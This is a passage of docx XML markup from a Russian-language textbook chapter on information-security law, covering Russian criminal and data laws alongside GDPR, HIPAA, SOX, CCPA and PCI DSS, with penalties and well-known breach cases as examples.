        <w:t xml:space="preserve">: В 2021 году </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>хакеры атаковали Colonial Pipeline</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (США) — крупнейший нефтепровод. Компания заплатила вымогателям $4.4 млн. Закон 187-ФЗ в России призван предотвратить такие сценарии (обязывая защищать КИИ).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>149-ФЗ "Об информации, информационных технологиях и о защите информации" (2006)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Что регулирует</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Права на информацию (открытая, конфиденциальная, государственная тайна)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Защита информации</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Блокировка сайтов (Роскомнадор может заблокировать сайт за экстремизм, пиратство, детское порно)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Важные моменты</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Блокировка по решению суда** (RKN, реестр запрещённых сайтов)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Ответственность за распространение запрещённой информации**</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Уголовный кодекс РФ (УК РФ)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Статья 272: Неправомерный доступ к компьютерной информации</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Наказание**: штраф до **₽200,000** или **лишение свободы до 2 лет**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**С причинением крупного ущерба** (&gt; ₽1 млн): до **5 лет** лишения свободы</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Группой лиц**: до **7 лет**</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: В 2020 году студент из Казани взломал сайт университета и изменил оценки себе и друзьям. Получил </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>2 года условно</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> + штраф </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>₽50,000</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Статья 273: Создание, использование и распространение вредоносных программ</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Наказание**: до **4 лет** лишения свободы</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**С тяжкими последствиями** (парализована работа больницы, например): до **7 лет**</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: В 2017 году </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>WannaCry</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> зашифровал компьютеры в </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>300,000</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> организаций (включая больницы в Британии). Создателей до сих пор ищут, но если поймают — реальный срок.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Статья 274: Нарушение правил эксплуатации средств хранения, обработки или передачи компьютерной информации</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Для админов**: если админ не обновил систему, и это привело к утечке/взлому</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Наказание**: штраф до **₽500,000** или **лишение свободы до 5 лет**</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t>: Если ты админ больницы и не обновил Windows, из-за чего пришёл WannaCry и зашифровал базы пациентов — можешь сесть по этой статье.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Статья 159.6: Мошенничество в сфере компьютерной информации</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Фишинг, кардинг** (кража денег с карт через поддельные сайты)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Наказание**: до **10 лет** лишения свободы</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>9.7.2. Международное законодательство в области ИБ</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>GDPR (General Data Protection Regulation) — Европа</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Главный закон о защите данных в ЕС</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (вступил в силу </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>25 мая 2018</w:t>
      </w:r>
      <w:r>
        <w:t>).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Для кого</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Любая компания, работающая с данными жителей ЕС (даже если сервера в США/России)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Например, российский интернет-магазин продаёт товары в Германию → подпадает под GDPR</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Основные требования</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Прозрачность**: пользователь должен знать, **какие данные собираются** и **зачем**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Согласие**: явное согласие (галочка "Я согласен", **pre-checked галочки запрещены**)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Право на забвение**: пользователь может потребовать удалить все его данные</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Право на переносимость**: скачать свои данные (например, экспорт из Facebook)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Privacy by Design**: защита данных должна быть **встроена в систему** (а не "прикручена потом")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Data Breach Notification**: при утечке уведомить регулятора **в течение 72 часов**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**DPO (Data Protection Officer)**: назначить ответственного за защиту данных</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Штрафы GDPR</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (самые жёсткие в мире):</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Уровень 1**: до **€10 млн** или **2% годового оборота** (что больше)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Нарушения: нет DPO, не уведомили о утечке</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Уровень 2**: до **€20 млн** или **4% годового оборота**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Нарушения: утечка данных, нет согласия пользователя</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры штрафов</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| Год | Компания | Нарушение | Штраф |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>|-----|----------|-----------|-------|</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| 2019 | </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Google</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | Нет прозрачности при сборе данных для таргетированной рекламы | </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>€50 млн</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| 2020 | </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>British Airways</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | Утечка данных 400,000 пассажиров (уменьшен с £183 млн из-за COVID) | </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>£20 млн</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| 2022 | </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Meta (Instagram)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | Неправильная обработка данных детей | </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>€405 млн</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| 2023 | </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Meta (Facebook)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | Передача данных европейцев в США без адекватной защиты | </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>€1.2 млрд</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 🔥 |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Почему GDPR такой жёсткий?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Потому что в ЕС считают </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>приватность — базовым правом человека</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (как свобода слова). А компании типа Facebook/Google зарабатывают миллиарды на данных пользователей, так что штрафы должны быть </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>болезненными</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>HIPAA (Health Insurance Portability and Accountability Act) — США</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Для кого</w:t>
      </w:r>
      <w:r>
        <w:t>: Больницы, клиники, страховые компании (работают с медицинскими данными).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Что регулирует</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Защита **PHI (Protected Health Information)** — медицинских данных (диагнозы, анализы, история болезни)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Требования</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Шифрование данных (at rest и in transit)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Разграничение доступа (только врачи пациента видят данные)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Аудит логов</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Business Associate Agreement (BAA) — договор с подрядчиками о защите данных</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Штрафы</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**$100 - $50,000** за нарушение (зависит от серьёзности)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Максимум**: $1.5 млн в год</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: В 2021 году </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Anthem</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (страховая) заплатила </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>$16 млн</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> штрафа за утечку данных 79 млн пациентов (2015).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>SOX (Sarbanes-Oxley Act, 2002) — США</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Для кого</w:t>
      </w:r>
      <w:r>
        <w:t>: Публичные компании (акции торгуются на бирже).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Что регулирует</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Финансовая отчётность (чтобы не было **второго Enron**)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Раздел 404**: компания должна **доказать** безопасность своих IT-систем (аудит)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Наказание</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Для CEO/CFO**: штраф до **$5 млн** + **до 20 лет тюрьмы** (за подлог финансовой отчётности)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>CCPA (California Consumer Privacy Act, 2020) — Калифорния, США</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Похож на GDPR</w:t>
      </w:r>
      <w:r>
        <w:t>, но только для жителей Калифорнии.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Права пользователей</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Узнать, **какие данные собираются**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Потребовать **удалить данные**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Запретить **продажу данных** третьим лицам</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Штрафы</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**$2,500** за нарушение (непреднамеренное)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**$7,500** за преднамеренное нарушение</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**При утечке**: пользователь может **подать в суд** ($100-$750 за инцидент)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>PCI DSS (Payment Card Industry Data Security Standard)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Для кого</w:t>
      </w:r>
      <w:r>
        <w:t>: Любой, кто принимает платежи по картам (Visa, Mastercard, Mir).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Не закон</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (это стандарт платёжных систем), но </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>обязателен</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> для всех магазинов.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>12 требований PCI DSS</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (кратко):</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Firewall (защита сети)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Не использовать дефолтные пароли (меняй "admin/admin")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Шифровать данные карт (PAN — Primary Account Number)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Шифровать передачу данных (TLS 1.2+)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Антивирус</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Обновлять системы (патчи)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Разграничение доступа (need-to-know)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Уникальные ID для пользователей (не shared accounts)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Физическая защита (закрытая серверная)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Логирование (журналы доступа, хранить 1 год)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Пентестинг (ежегодно)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Политика безопасности (документ)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Уровни соответствия</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (зависят от объёма транзакций):</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| Уровень | Транзакций в год | Требования |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>|---------|------------------|------------|</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Level 1</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | &gt; 6 млн | Ежегодный аудит QSA (Qualified Security Assessor), пентест |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Level 2</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | 1 - 6 млн | Ежегодная самооценка (SAQ), квартальное сканирование уязвимостей |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Level 3</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | 20,000 - 1 млн | SAQ + сканирование |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Level 4</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | &lt; 20,000 | SAQ + сканирование |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Штрафы</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**$5,000 - $100,000** в месяц (платёжная система штрафует банк, банк — магазин)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**При утечке**: могут запретить принимать карты (смерть для бизнеса)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: В 2013 году </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Target</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (США) потеряли данные </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>40 млн карт</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. Штраф: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>$18.5 млн</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> + иски клиентов + репутационный ущерб.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>9.7.3. Критерии защищённости компьютерных систем (ФСТЭК России)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ФСТЭК (Федеральная служба по техническому и экспортному контролю)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — регулятор в области ИБ в России.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
